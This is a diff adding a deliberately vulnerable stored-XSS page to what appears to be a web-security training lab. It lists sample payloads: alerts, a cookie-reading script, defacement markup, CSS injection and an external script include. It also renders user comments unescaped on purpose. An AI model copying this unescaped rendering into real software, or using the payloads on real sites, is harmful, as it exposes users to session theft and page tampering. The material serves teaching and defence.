@@ -1,0 +1,158 @@
+<h2>Stored XSS (Vulnerable)</h2>
+
+<div class="info-box">
+  <h3>
+    <i class="fas fa-info-circle"></i> What is Stored XSS? (Vulnerable Version)
+  </h3>
+  <p>
+    This page demonstrates a Stored XSS vulnerability. User-supplied comments
+    are saved directly to the database and then rendered to other users without
+    proper sanitization or escaping. This allows malicious scripts to be stored
+    and executed in the browsers of other users who view the page.
+  </p>
+  <p>
+    Try submitting a comment below. If your comment includes a script, it will
+    execute when the page displays it.
+  </p>
+</div>
+
+<form method="POST">
+  <textarea
+    name="content"
+    required
+    placeholder="Write a comment or try an XSS payload..."
+  ></textarea>
+  <button type="submit"><i class="fas fa-comment-dots"></i> Add Comment</button>
+</form>
+
+<div class="info-box">
+  <h3><i class="fas fa-bug"></i> Example XSS Payloads</h3>
+  <p>Try submitting these payloads as comments:</p>
+
+  <div class="payload-example">
+    &lt;script&gt;alert('Simple Stored XSS!')&lt;/script&gt;
+  </div>
+  <p class="caption">- A simple JavaScript alert box.</p>
+
+  <div class="payload-example">
+    &lt;img src=x onerror="alert('Stored XSS via Image Error!')"&gt;
+  </div>
+  <p class="caption">
+    - Triggers a JavaScript alert when an image fails to load.
+  </p>
+
+  <div class="payload-example">
+    &lt;svg onload="alert('Stored XSS with SVG!')"&gt;&lt;/svg&gt;
+  </div>
+  <p class="caption">
+    - Triggers a JavaScript alert when the SVG element loads.
+  </p>
+
+  <hr />
+  <h4>Advanced / Different Types of Payloads:</h4>
+
+  <div class="payload-example">
+    &lt;script&gt;alert("Cookie: " + document.cookie)&lt;/script&gt;
+  </div>
+  <p class="caption">
+    - Simulates stealing and displaying the document's cookies. In a real
+    attack, this data would be sent to an attacker's server. (Note: HttpOnly
+    cookies cannot be accessed this way).
+  </p>
+
+  <div class="payload-example">
+    &lt;h1 style="color:red;"&gt;PAGE DEFACED!&lt;/h1&gt;&lt;marquee&gt;XSS WAS
+    HERE&lt;/marquee&gt;
+  </div>
+  <p class="caption">
+    - Injects new HTML elements to alter the page content, demonstrating
+    defacement.
+  </p>
+
+  <div class="payload-example">
+    &lt;style&gt;body{transform: rotate(3deg); background-color: #ffcccc
+    !important;}&lt;/style&gt;
+  </div>
+  <p class="caption">
+    - Injects CSS styles to change the appearance of the page (e.g., rotate
+    body, change background). Shows that XSS is not just about
+    <code>&lt;script&gt;</code> tags.
+  </p>
+
+  <div class="payload-example">
+    &lt;!-- &lt;script
+    src="http://localhost:3001/malicious.js"&gt;&lt;/script&gt; --&gt; &lt;!--
+    For demonstration only. This would require an actual server at
+    localhost:3001 serving malicious.js --&gt; &lt;!-- Example: alert('Script
+    from external source executed!'); --&gt;
+  </div>
+  <p class="caption">
+    - Attempts to load and execute a script from an external source. This is
+    often blocked by Content Security Policy (CSP) in real applications.
+    (Commented out as it requires a live external server).
+  </p>
+</div>
+
+<div class="info-box">
+  <h3><i class="fas fa-code"></i> Vulnerable Code Snippet (EJS)</h3>
+  <p>
+    The vulnerability on this page is due to comments being directly embedded
+    into the HTML without escaping (using <code>&lt;%- ... %&gt;</code>):
+  </p>
+  <div class="payload-example">
+    &lt;ul&gt; &lt;% comments && comments.forEach(function(comment) { %&gt;
+    &lt;li&gt;&lt;%- comment.content %&gt;&lt;/li&gt;
+    <span style="color: #e74c3c">&lt;!-- VULNERABILITY HERE! --&gt;</span>
+    &lt;% }) %&gt; &lt;/ul&gt;
+  </div>
+</div>
+
+<h3><i class="fas fa-comments"></i> Comments</h3>
+<!-- Clear Comments Button Form -->
+<form
+  method="POST"
+  action="/stored/clear-comments"
+  style="display: inline-block; margin-bottom: 15px"
+  onsubmit="return confirm('Are you sure you want to delete all comments?');"
+>
+  <button type="submit" class="button-clear">
+    <i class="fas fa-trash-alt"></i> Clear All Comments
+  </button>
+</form>
+<!-- End Clear Comments Button Form -->
+
+<ul>
+  <% comments && comments.forEach(function(comment) { %>
+  <li><%- comment.content %></li>
+  <% }) %>
+</ul>
+
+<div class="info-box further-reading">
+  <h3><i class="fas fa-book-open"></i> Further Reading on Stored XSS</h3>
+  <ul>
+    <li>
+      <a
+        href="https://owasp.org/www-community/attacks/xss/"
+        target="_blank"
+        rel="noopener noreferrer"
+        >OWASP: Cross Site Scripting (XSS)</a
+      >
+    </li>
+    <li>
+      <a
+        href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        target="_blank"
+        rel="noopener noreferrer"
+        >OWASP: XSS Prevention Cheat Sheet</a
+      >
+    </li>
+    <li>
+      <a
+        href="https://portswigger.net/web-security/cross-site-scripting/stored"
+        target="_blank"
+        rel="noopener noreferrer"
+        >PortSwigger: Stored XSS</a
+      >
+    </li>
+  </ul>
+</div>
